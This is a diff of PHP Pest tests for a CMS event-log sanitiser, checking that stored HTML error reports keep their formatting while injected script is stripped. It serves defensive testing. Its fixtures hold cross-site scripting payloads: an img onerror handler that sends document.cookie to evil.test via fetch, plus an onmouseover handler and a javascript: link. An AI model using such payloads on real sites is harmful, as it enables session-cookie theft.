@@ -72,19 +72,74 @@ test('printing the sanitised description keeps the layout and disarms the payloa
 
     $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);
 
-    // No executable element reaches the browser.
-    expect($output)->not->toContain('<script>')
-        ->and($output)->not->toContain('</script>');
+    // No executable element and no handler reaches the browser.
+    expect($output)->not->toContain('<script')
+        ->and($output)->not->toContain('</script>')
+        ->and($output)->not->toContain('evil.test');
 
-    // The message is still readable, and the formatting the CMS wrote is still formatting.
+    // The message is still readable and the formatting the CMS wrote is still formatting.
     expect($output)->toContain('Import failed')
-        ->and($output)->toContain('<br />')
+        ->and($output)->toContain('<br>')
         ->and($output)->toContain('<pre>')
-        ->and($output)->toContain('&lt;script&gt;');
+        ->and($output)->toContain('bad value:');
+});
 
-    // Nothing was encoded twice: the visible text is exactly the stored text.
-    expect(html_entity_decode(strip_tags($output), ENT_QUOTES, 'UTF-8'))
-        ->toContain('bad value: <script>fetch("//evil.test/"+document.cookie)</script>');
+test('the error report ExceptionHandler stores still renders as a report', function () {
+    // ExceptionHandler writes a whole HTML document into the description: styled headings,
+    // MakeTable grids and formatted <pre> blocks. Escaping it would show the operator raw
+    // source code instead of the report, so the presentation attributes have to survive.
+    $report = '<h2 style="color:red">&laquo; Evolution CMS Parse Error &raquo;</h2>'
+        . '<table class="grid"><thead><tr class=""><th width="100px">Error information</th><th></th></tr></thead>'
+        . '<tr class="gridItem"><td>File</td><td>/core/src/Thing.php</td></tr></table><br />'
+        . '<pre style="font-weight:bold;border:1px solid #ccc;background-color:#ffffcd;">SQL &gt; SELECT 1</pre>'
+        . '<td><strong>Handler-&gt;handleShutdown</strong>()</td>';
+
+    $log = (new EventLog())->setRawAttributes([
+        'type' => EventLog::TYPE_ERROR,
+        'description' => $report,
+    ], true);
+
+    $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);
+
+    // Structure and presentation are intact.
+    expect($output)->toContain('<h2 style="color:red">')
+        ->and($output)->toContain('<table class="grid">')
+        ->and($output)->toContain('width="100px"')
+        ->and($output)->toContain('<tr class="gridItem">')
+        ->and($output)->toContain('<strong>')
+        ->and($output)->toContain('background-color:#ffffcd');
+
+    // Not a single tag is shown as literal text.
+    expect($output)->not->toContain('&lt;table')
+        ->and($output)->not->toContain('&lt;h2')
+        ->and($output)->not->toContain('&lt;pre');
+
+    // Entities that were already encoded are not encoded a second time.
+    expect($output)->toContain('SQL &gt; SELECT 1')
+        ->and($output)->not->toContain('&amp;gt;');
+});
+
+test('a payload hidden inside a stored error report is stripped, the report is not', function () {
+    $report = '<table class="grid" onmouseover="alert(1)"><tr><td>File</td>'
+        . '<td>/tmp/<img src=x onerror="fetch('//evil.test/'+document.cookie)">.php</td></tr></table>'
+        . '<a href="javascript:alert(1)">details</a>';
+
+    $log = (new EventLog())->setRawAttributes([
+        'type' => EventLog::TYPE_ERROR,
+        'description' => $report,
+    ], true);
+
+    $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);
+
+    expect($output)->not->toMatch('~\son[a-z]+\s*=~i')
+        ->and($output)->not->toContain('javascript:')
+        ->and($output)->not->toContain('evil.test')
+        ->and($output)->not->toContain('<img');
+
+    // The surrounding report is untouched, including the link text.
+    expect($output)->toContain('<table class="grid">')
+        ->and($output)->toContain('<td>File</td>')
+        ->and($output)->toContain('details');
 });
 
 test('the encoded mail body marker stays invisible after escaping', function () {
